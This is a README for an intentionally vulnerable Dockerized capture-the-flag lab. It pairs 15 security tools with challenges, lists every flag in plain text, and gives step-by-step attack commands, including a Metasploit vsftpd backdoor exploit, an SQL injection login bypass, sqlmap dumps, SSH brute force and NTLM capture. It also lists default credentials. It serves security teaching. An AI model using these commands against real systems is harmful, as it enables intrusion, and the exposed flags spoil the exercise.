# CYBERDEMON CTF - Vulnerable Web Application Lab

A Dockerized, intentionally vulnerable web application for demonstrating 15 security tools in a Capture The Flag format.

## Warning

This application contains DELIBERATE security vulnerabilities.
- NEVER deploy on public networks
- ONLY use in isolated environments
- FOR EDUCATIONAL PURPOSES ONLY

## Quick Start

```bash
cd /home/demonwarrior/Demonstration
docker compose up -d
```

Access the CTF at: `http://localhost:5000`

## Architecture

```
Docker Network (vulnlab-network)
├── vulnweb           - Flask CTF app        (port 5000)
├── vulnweb-mysql     - MySQL 5.7            (port 3307)
├── vulnweb-ftp       - VSFTPD              (port 2121)
├── vulnweb-ssh       - OpenSSH             (port 2222)
├── vulnweb-wordpress - WordPress           (port 8080)
└── vulnweb-metasploitable - Metasploitable2
    ├── vsftpd 2.3.4  (port 2122)
    ├── SSH           (port 2223)
    ├── Apache        (port 81)
    ├── MySQL         (port 3308)
    ├── PostgreSQL    (port 5434)
    ├── Samba         (port 4450)
    ├── Telnet        (port 2323)
    └── IRC           (port 6667)
```

## CTF Challenges

| # | Tool | Flag | Points | Method |
|---|------|------|--------|--------|
| 1 | Nmap | `FLAG{h34d3rs_3xpl0s3d_by_nmap}` | 15 | HTTP response headers |
| 2 | Metasploit | `FLAG{vsftpd_b4ckd00r_pwn3d}` | 25 | vsftpd 2.3.4 backdoor exploit |
| 3 | Burp Suite | `FLAG{sql1_byp4ss3d_via_burp}` | 20 | SQL injection + header inspection |
| 4 | Wireshark | `FLAG{ftp_p4ss_c4ptur3d}` | 15 | HTTP header capture |
| 5 | Nikto | `FLAG{b4ckup_f1l3_f0und}` | 10 | Vulnerable login + backup file |
| 6 | Gobuster | `FLAG{h1dd3n_d1r_3xp10r3d}` | 15 | Directory brute-force |
| 7 | SQLmap | `FLAG{d4t4b4s3_dump3d}` | 20 | SQL injection database dump |
| 8 | John the Ripper | `FLAG{h4sh_cr4ck3d_by_j0hn}` | 15 | MD5 hash cracking |
| 9 | Hashcat | `FLAG{4ll_p4ssw0rds_cr4ck3d}` | 15 | GPU MD5 cracking |
| 10 | Hydra | `FLAG{ssh_brut3_f0rc3d}` | 15 | SSH brute force |
| 11 | Responder | `FLAG{dns_p01s0n3d}` | 20 | NTLM hash capture |
| 12 | Netcat | `FLAG{ftp_w3lc0m3_m3ss4g3}` | 10 | FTP banner grabbing |
| 13 | BeEF | `FLAG{br0ws3r_h00k3d}` | 20 | Browser hooking via XSS |
| 14 | SET | `FLAG{ph1sh1ng_s1t3_cl0n3d}` | 15 | Site cloning |
| 15 | Aircrack-ng | `FLAG{w1f1_h4ndsh4k3_cr4ck3d}` | 20 | WiFi handshake cracking |

**Total: 245 points across 15 challenges**

## CTF Features

- User registration and login
- Progress tracking per player
- Completed missions disappear from main list
- Admin reset button (user: DEMON) saves data to JSON
- Scoreboard with rankings
- Flag submission with instant feedback

## Tool Commands

### Nmap
```bash
nmap -sV -p 5000 localhost
curl -I http://localhost:5000
```

### Metasploit
```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS vulnweb-metasploitable
set RPORT 21
set AutoCheck false
exploit
# Then: cat /flag.txt
```

### Burp Suite
1. Set proxy to `127.0.0.1:8080`
2. Intercept POST to `/ctf/tool/burpsuite/login`
3. Change username to: `admin' OR '1'='1`
4. Forward request, check response headers for `X-CTF-Flag`

### Wireshark
```bash
sudo wireshark -i any -f "tcp port 5000"
# Click "Send Packet" on /ctf/tool/wireshark page
# Filter: http.response.header contains "X-Secret-Token"
```

### Nikto
```bash
nikto -h http://localhost:5000/ctf/tool/nikto/login
# Find: /ctf/tool/nikto/backup.sql
# Login: admin/admin
```

### Gobuster
```bash
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt
# Find: /ctf/tool/gobuster/secret/flag.txt
```

### SQLmap
```bash
sqlmap -u "http://localhost:5000/ctf/tool/sqlmap/api?username=admin" --dbs
sqlmap -u "http://localhost:5000/ctf/tool/sqlmap/api?username=admin" -D vulnerable -T flag --dump
```

### John the Ripper
```bash
curl -O http://localhost:5000/ctf/tool/john/hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
curl http://localhost:5000/ctf/tool/john/flag.txt
```

### Hashcat
```bash
curl -O http://localhost:5000/ctf/tool/hashcat/hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
curl http://localhost:5000/ctf/tool/hashcat/flag.txt
```

### Hydra
```bash
curl -O http://localhost:5000/ctf/tool/hydra/passwords.txt
hydra -l msfadmin -P passwords.txt ssh://127.0.0.1:2223
curl http://localhost:5000/ctf/tool/hydra/flag.txt
```

### Responder
```bash
sudo responder -I docker0 -v
# Click NTLM/SMB buttons on /ctf/tool/responder page
```

### Netcat
```bash
nc localhost 2121
# Read FTP banner for flag
```

## Default Credentials

| Service | Username | Password |
|---------|----------|----------|
| Flask App | admin | admin |
| Flask App | user | password |
| Flask App | test | test123 |
| MySQL | root | root |
| Metasploitable SSH | msfadmin | msfadmin |
| Nikto Login | admin | admin |

## Services

| Service | Port | Purpose |
|---------|------|---------|
| Flask App | 5000 | Main CTF application |
| MySQL | 3307 | Database |
| FTP | 2121 | FTP testing |
| SSH | 2222 | SSH testing |
| WordPress | 8080 | WordPress testing |
| Metasploitable | 2122 | vsftpd backdoor |
| Metasploitable SSH | 2223 | SSH brute force |

## Cleanup

```bash
docker compose down -v
```

## Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

## Disclaimer

This project is for educational purposes only. The authors are not responsible for any misuse of this software. Only use in authorized testing environments.
